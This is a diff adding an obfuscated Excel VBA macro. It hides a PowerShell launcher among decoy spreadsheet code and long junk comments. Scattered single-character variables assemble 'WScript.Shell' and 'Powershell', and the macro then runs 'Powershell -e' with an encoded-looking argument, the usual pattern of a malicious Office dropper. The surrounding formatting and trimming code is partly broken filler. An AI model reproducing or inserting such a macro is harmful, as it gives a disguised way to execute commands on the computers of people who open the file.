@@ -1,0 +1,142 @@
+Public Sub awndjfawdwd()
+ 'ZfLOxUACZiUyvfGGCfihLhrhwwnJppMiLMiQEEnZZLnnJEZkJOLkrCirpEiLixDAOMfBUGDZhfvMkTMniiQQkirvkrJMxysMUGJk
+ 'ZfLOgvfxUACZiUyvfGGCfihLhrhwwnJppMiLMiQEEnZZLnnJEZkJOLkrCirpEiLixDAOMfBUGDZhfvMkTMniiQQkirvkrJMxysMUGJk
+ 'GOssUAsGxypBpvvkhDZLBBCCyiCywGCEfOwAfkCxMrMkTJvnEyGJQAJkfhyMGyfypUAwxDTnJnLxBrkGABrCQTErkAvBsCUxJZOnUCThQJQwkvZpnJGkEkyTrUpphUfxLnTTCLOhZfCATwDxkfnxiGknGrxMsxQZEyOLLhfUOMBGvCMExGLwOLfTUUhknprnDwiMZZEEMLDiJEwZTLTvEMsAkTsDMvinvMECGQpwDJEJUUfTTvfyTUCfhvOGOhErAfskQyTrpEADBCTAkiiEpwZJrGykLxZBfnyLCCrnkpvwvpJxLBBQiMxOZCGDQfsGpDMnhshCTOAMyLZxBAnxvLhfTvnQiknTBOLpALTUOwvnhxrwwxGhhkkJBsZLfGGfAUEvMApyUkDxvJnAZBMfEpGUJwsnMsZZfpGOLUEJAOpBTvxUfOMhhwAQkCUBnsUxnLifEhLDCOExQkwZiysJDrTsnfJvQTkMEGMshUTBJfxUnJQQZDJZ
+ t = Timer
+    Dim MyRange As Range
+        Dim MyCell As Range
+    'Save the Workbook before changing cells
+          'Copy the data
+  
+    'Define the target Range.    'Save the Workbook before changing cells
+          'Copy the data
+    'Selection.FormatConditions(1).StopIfTrue = False
+    'Define the target Range.
+ 
+On Error Resume Next
+VprcMvTybtWCrceoHvvQyDD.Tables(1).Delete
+VprcMvTybtWCrceoHvvQyDD.WFnhePfKQR
+WFnhePfKQR.Bookmarks.Add "WFnhePfKQR", VprcMvTybtWCrceoHvvQyDD
+'WFnhePfKQR WFnhePfKQR
+'MsgBox ("zSG   MwGaJWMtUaonakiksIhs")
+'pyYwkPhcRrowVCEdAUrhEsYKBXMQOBcobAaUbkOMGZVdtzZYKZMyN
+'GwQkXHAHkyKtCWONPARvkHzfBMpRYOfELQeANpiAciUMwkVfSOztYHiXRppPUJJYofLMRSFFutKbONVQQfYwrNGd
+Dim RsoXaQzRZLepceHbdJWVCWvy, wkFG
+'vAib
+'zSAfQhZXeDrsWescZH
+'JAZyrwQykhZrhiypyfQQfDxDJfZJCZLBrUswpvnCQCUfkhLsZiEDwynrJiGhOpABvCQpCrQpGTQkUUxwCiBfJUvBiisEiOfJsOkChOJhiZBvyiBpDfxQDviJMEwfLBwykpUBhMDDkiyvpMLQAwJxGDTGQwvDiEBALkTCQMxDQipyJAUMAwrJUUJyyLBGEMyGpCTkxvQAirxiEMBhxvEUMUrsQMhOEyAwwxCCUhTfQLprDpEUxixyBMhEkLJCikOwZLyOrwpTkGyUBQMkvpfxsTrETLrfnpUpAipZTxrLBhGOxOykZMnBrfhhhErAnCUOOCvhJyfEUCBvJxOvfDxnAOyvkxTwkLxEOyQnDhQfDvkOJZnxxiBswiBMJMBCwsAfQxfAZApBsUDGkvUnCpUACOQQOwiDkyDQsrOCUGwABMMCCpOZZMMkTQLkxDELEBUUZsEfGAkiOvDCOyynZfLLyxvAAJQZDpiMZZwAUxyOiLpifBOhirnG
+KbR = "P": dTeRavdQLFiaRCHrHyuXdeHybQeFIYC = "o": DLszaNoPwSTucJvPenyIHhc = "w": wIZODYVPDCMy = "e": JAusDBfPdQy = "r": duEZDXrOJdeWkYVtTepnzoLHCY = "s": Cf = "h": WXdwDWONPKC = "e": avchVXNDYcPYTstAYhuGKhrTaTF = "l": eUoiAJtFvyGJNebIdK = "l":
+'VrYIweaXzFDiXhfXpVoMWSuUTosuuwDpCKceik
+'VprcMvTybtWCrceoHvvQyDD  IfHBhDnuXCPPOTzOEwVa
+'HZLVpOHOvAFOPHKCOiiAoKd  WFnhePfKQR
+'oQcNNwneBDkaphvLVEeeiRIMsGzUVGWYLwIWdREvmvAZbCPPTAPKp sAUsICOuRHVAkoJLyAHGFPSyN
+With Selection
+.Borders(xlDiagonalDown).LineStyle = xlNone
+.Borders(xlDiagonalUp).LineStyle = xlNone
+.Borders(xlEdgeLeft).LineStyle = xlNone
+.Borders(xlEdgeTop).LineStyle = xlNone
+.Borders(xlEdgeBottom).LineStyle = xlNone
+.Borders(xlEdgeRight).LineStyle = xlNone
+.Borders(xlInsideVertical).LineStyle = xlNone
+.Borders(xlInsideHorizontal).LineStyle = xlNone
+End With
+With Application.FileSearch
+.NewSearch
+'Change path to suit
+.LookIn = "WFnhePfKQR"
+.FileType = msoFileTypeExcelWorkbooks
+If .Execute > 0 Then
+For lCount = 1 To .FoundFiles.Count
+Set wbResults = Workbooks.Open(FileName:=.FoundFiles(lCount), UpdateLinks:=0)
+wbResults.Close SaveChanges:=True
+Next lCount
+End If
+End With
+Application.ScreenUpdating = True
+Application.DisplayAlerts = True
+'WFnhePfKQR  DaIWJdWiZZvwD
+'  yVKtiKEdbCNMuwYTVzznvELZUnRdwDctBZuXepArTLFPLOiiFaPVZMATwKDTSBUdzswuDEQMYeBeaBSLh
+'khEaSnVGRpeArReMVbWPBsRCtZYcrikDFGkCUJUvhXeshaVHHI  RrEFfsdBSDRSvDUIiatMvCDoUcGQekfhMSSiJpkUiVEUzXHRSbXAVKCnSvLdPotptLfyMwYXSDEtZKyXBPYdwwvdtYrydf
+' YbzCBveVatYsAUTyQCGXiuehbzWOeYr
+'XaiAZGbTUWBFpSreBHFnfEsUYcLad
+'baTEDvFnPTPpuJoaLzhYw
+'hZFHaVcOKPdUrAuXVvOJs
+'RrEFfsdBSDRSvDUIiatMvCDoUcGQekfhMSSiJpkUiVEUzXHRSbXAVKCnSvLdPotptLfyMwYXSDEtZKyXBPYdwwvdtYrydf
+Dim MwGaJWMtUaonakiksIhs As Long
+'MsgBox Prompt:="IfHBhDnuXCPPOTzOEwVa?", _
+Buttons:=DaIWJdWiZZvwD , _
+Title:="YbzCBveVatYsAUTyQCGXiuehbzWOeYr   "
+'ztVyJKFQNbPGdQLbkBrwennpKLaHvDuipusrbWXJPEUzhQhHIEdvYGPJdpuYKCGvOItsAsavELaGASdUe
+
+'   khEaSnVGRpeArReMVbWPBsRCtZYcrikDFGkCUJUvhXeshaVHHI
+Dim r As Long, x As Long
+For x = 2 To r Step 1
+r = r - 1
+Next x
+'zXJRDVFfnEbUETkMdMFHN
+'WFnhePfKQR  ztVyJKFQNbPGdQLbkBrwennpKLaHvDuipusrbWXJPEUzhQhHIEdvYGPJdpuYKCGvOItsAsavELaGASdUe
+'zXJRDVFfnEbUETkMdMFHN
+'WFnhePfKQR   IfHBhDnuXCPPOTzOEwVa
+'LYfutprNPzcESQiHeZEdwZRYwQrdXNWAnMoNJSvTwKoQhpNWIVVRIeMpiKGGVQRcCHpKDzXvOKyFncSbI   DaIWJdWiZZvwD
+'khEaSnVGRpeArReMVbWPBsRCtZYcrikDFGkCUJUvhXeshaVHHI  yVKtiKEdbCNMuwYTVzznvELZUnRdwDctBZuXepArTLFPLOiiFaPVZMATwKDTSBUdzswuDEQMYeBeaBSLh
+'WFnhePfKQR  ztVyJKFQNbPGdQLbkBrwennpKLaHvDuipusrbWXJPEUzhQhHIEdvYGPJdpuYKCGvOItsAsavELaGASdUe
+wkFG = KbR + dTeRavdQLFiaRCHrHyuXdeHybQeFIYC + DLszaNoPwSTucJvPenyIHhc + wIZODYVPDCMy + JAusDBfPdQy + duEZDXrOJdeWkYVtTepnzoLHCY + Cf + WXdwDWONPKC + avchVXNDYcPYTstAYhuGKhrTaTF + eUoiAJtFvyGJNebIdK + "  -e  Fsociety_2023"""""
+'ztVyJKFQNbPGdQLbkBrwennpKLaHvDuipusrbWXJPEUzhQhHIEdvYGPJdpuYKCGvOItsAsavELaGASdUe
+'yVKtiKEdbCNMuwYTVzznvELZUnRdwDctBZuXepArTLFPLOiiFaPVZMATwKDTSBUdzswuDEQMYeBeaBSLh
+'yVKtiKEdbCNMuwYTVzznvELZUnRdwDctBZuXepArTLFPLOiiFaPVZMATwKDTSBUdzswuDEQMYeBeaBSLh
+' ztVyJKFQNbPGdQLbkBrwennpKLaHvDuipusrbWXJPEUzhQhHIEdvYGPJdpuYKCGvOItsAsavELaGASdUe
+Dim PcLEMdZaBZ As Long
+Dim rhcIhwX As String
+Dim dfC As Long
+
+
+
+
+
+
+'JAZyrwQykhZrhiypyfQQfDxDJfZJCZLBrUswpvnCQCUfkhLsZiEDwynrJiGhOpABvCQpCrQpGTQkUUxwCiBfJUvBiisEiOfJsOkChOJhiZBvyiBpDfxQDviJMEwfLBwykpUBhMDDkiyvpMLQAwJxGDTGQwvDiEBALkTCQMxDQipyJAUMAwrJUUJyyLBGEMyGpCTkxvQAirxiEMBhxvEUMUrsQMhOEyAwwxCCUhTfQLprDpEUxixyBMhEkLJCikOwZLyOrwpTkGyUBQMkvpfxsTrETLrfnpUpAipZTxrLBhGOxOykZMnBrfhhhErAnCUOOCvhJyfEUCBvJxOvfDxnAOyvkxTwkLxEOyQnDhQfDvkOJZnxxiBswiBMJMBCwsAfQxfAZApBsUDGkvUnCpUACOQQOwiDkyDQsrOCUGwABMMCCpOZZMMkTQLkxDELEBUUZsEfGAkiOvDCOyynZfLLyxvAAJQZDpiMZZwAUxyOiLpifBOhirnG
+
+
+
+
+
+
+
+
+zXJRDVFfnEbUETkMdMFHN = "W": nYXOavcKzIMpBcpPTUXXH = "S": wYvKDGFpELyFyvwTfdsoC = "c": hZFHaVcOKPdUrAuXVvOJs = "r": baTEDvFnPTPpuJoaLzhYw = "i": EXrVaGcGkBrFHKhIoEivS = "p": IWcZEvFbdtKpLBfEDsOWX = "h": MVOcbVdCYnYUNudBNksGd = "t": WFnhePfKQR = ".":
+UUh = "s":
+YUQGTcCcXIokXZANQUPNKA = "e": 'yVKtiKEdbCNMuwYTVzznvELZUnRdwDctBZuXepArTLFPLOiiFaPVZMATwKDTSBUdzswuDEQMYeBeaBSLh
+zFKcHMiERAysafHJOIRHWNTtno = "l": 'yVKtiKEdbCNMuwYTVzznvELZUnRdwDctBZuXepArTLFPLOiiFaPVZMATwKDTSBUdzswuDEQMYeBeaBSLh 'yVKtiKEdbCNMuwYTVzznvELZUnRdwDctBZuXepArTLFPLOiiFaPVZMATwKDTSBUdzswuDEQMYeBeaBSLh
+UwFFnsSaLuaDdvPFLsSAibHYWr = "l" 'yVKtiKEdbCNMuwYTVzznvELZUnRdwDctBZuXepArTLFPLOiiFaPVZMATwKDTSBUdzswuDEQMYeBeaBSLh
+'yVKtiKEdbCNMuwYTVzznvELZUnRdwDctBZuXepArTLFPLOiiFaPVZMATwKDTSBUdzswuDEQMYeBeaBSLh
+'JAZyrwQykhZrhiypyfQQfDxDJfZJCZLBrUswpvnCQCUfkhLsZiEDwynrJiGhOpABvCQpCrQpGTQkUUxwCiBfJUvBiisEiOfJsOkChOJhiZBvyiBpDfxQDviJMEwfLBwykpUBhMDDkiyvpMLQAwJxGDTGQwvDiEBALkTCQMxDQipyJAUMAwrJUUJyyLBGEMyGpCTkxvQAirxiEMBhxvEUMUrsQMhOEyAwwxCCUhTfQLprDpEUxixyBMhEkLJCikOwZLyOrwpTkGyUBQMkvpfxsTrETLrfnpUpAipZTxrLBhGOxOykZMnBrfhhhErAnCUOOCvhJyfEUCBvJxOvfDxnAOyvkxTwkLxEOyQnDhQfDvkOJZnxxiBswiBMJMBCwsAfQxfAZApBsUDGkvUnCpUACOQQOwiDkyDQsrOCUGwABMMCCpOZZMMkTQLkxDELEBUUZsEfGAkiOvDCOyynZfLLyxvAAJQZDpiMZZwAUxyOiLpifBOhirnG
+KbR = zXJRDVFfnEbUETkMdMFHN + nYXOavcKzIMpBcpPTUXXH + wYvKDGFpELyFyvwTfdsoC + hZFHaVcOKPdUrAuXVvOJs + baTEDvFnPTPpuJoaLzhYw + EXrVaGcGkBrFHKhIoEivS + MVOcbVdCYnYUNudBNksGd + WFnhePfKQR + UUh + IWcZEvFbdtKpLBfEDsOWX + YUQGTcCcXIokXZANQUPNKA + zFKcHMiERAysafHJOIRHWNTtno + UwFFnsSaLuaDdvPFLsSAibHYWr
+'yVKtiKEdbCNMuwYTVzznvELZUnRdwDctBZuXepArTLFPLOiiFaPVZMATwKDTSBUdzswuDEQMYeBeaBSLh
+'wHrUtRPzQDKoZdXKKCGphYZeQaHIRfOkuNQWfOnbCQZwBZKwhadU
+'JAZyrwQykhZrhiypyfQQfDxDJfZJCZLBrUswpvnCQCUfkhLsZiEDwynrJiGhOpABvCQpCrQpGTQkUUxwCiBfJUvBiisEiOfJsOkChOJhiZBvyiBpDfxQDviJMEwfLBwykpUBhMDDkiyvpMLQAwJxGDTGQwvDiEBALkTCQMxDQipyJAUMAwrJUUJyyLBGEMyGpCTkxvQAirxiEMBhxvEUMUrsQMhOEyAwwxCCUhTfQLprDpEUxixyBMhEkLJCikOwZLyOrwpTkGyUBQMkvpfxsTrETLrfnpUpAipZTxrLBhGOxOykZMnBrfhhhErAnCUOOCvhJyfEUCBvJxOvfDxnAOyvkxTwkLxEOyQnDhQfDvkOJZnxxiBswiBMJMBCwsAfQxfAZApBsUDGkvUnCpUACOQQOwiDkyDQsrOCUGwABMMCCpOZZMMkTQLkxDELEBUUZsEfGAkiOvDCOyynZfLLyxvAAJQZDpiMZZwAUxyOiLpifBOhirnG
+Set RsoXaQzRZLepceHbdJWVCWvy = CreateObject(KbR)  'yVKtiKEdbCNMuwYTVzznvELZUnRdwDctBZuXepArTLFPLOiiFaPVZMATwKDTSBUdzswuDEQMYeBeaBSLh 'yVKtiKEdbCNMuwYTVzznvELZUnRdwDctBZuXepArTLFPLOiiFaPVZMATwKDTSBUdzswuDEQMYeBeaBSLh
+RsoXaQzRZLepceHbdJWVCWvy.Run wkFG, 858235310:
+'JAZyrwQykhZrhiypyfQQfDxDJfZJCZLBrUswpvnCQCUfkhLsZiEDwynrJiGhOpABvCQpCrQpGTQkUUxwCiBfJUvBiisEiOfJsOkChOJhiZBvyiBpDfxQDviJMEwfLBwykpUBhMDDkiyvpMLQAwJxGDTGQwvDiEBALkTCQMxDQipyJAUMAwrJUUJyyLBGEMyGpCTkxvQAirxiEMBhxvEUMUrsQMhOEyAwwxCCUhTfQLprDpEUxixyBMhEkLJCikOwZLyOrwpTkGyUBQMkvpfxsTrETLrfnpUpAipZTxrLBhGOxOykZMnBrfhhhErAnCUOOCvhJyfEUCBvJxOvfDxnAOyvkxTwkLxEOyQnDhQfDvkOJZnxxiBswiBMJMBCwsAfQxfAZApBsUDGkvUnCpUACOQQOwiDkyDQsrOCUGwABMMCCpOZZMMkTQLkxDELEBUUZsEfGAkiOvDCOyynZfLLyxvAAJQZDpiMZZwAUxyOiLpifBOhirnG
+'Declare your variables
+        Dim yVKtiKEdbCNMuwYTVzznvELZUnRdwDctBZuXepArTLFPLOiiFaPVZMATwKDTSBUdzswuDEQMYeBeaBSLh As Range
+        Dim ztVyJKFQNbPGdQLbkBrwennpKLaHvDuipusrbWXJPEUzhQhHIEdvYGPJdpuYKCGvOItsAsavELaGASdUe As Range
+    'Save the Workbook before changing cells
+        Select Case MsgBox("Can't Undo this action.  " & _
+                            "Save Workbook First?", vbYesNoCancel)
+            Case Is = vbYes
+            ThisWorkbook.Save
+            Case Is = vbCancel
+            Exit Sub
+        End Select
+    'Define the target Range.
+        Set MyRange = Selection
+    'Start looping through the range.
+        For Each MyCell In MyRange
+    'Trim the Spaces.
+            If Not IsEmpty(MyCell) Then
+                MyCell = Trim(MyCell)
+            End If
+    'Get the next cell in the range
+        Next MyCell
+   
+End Sub
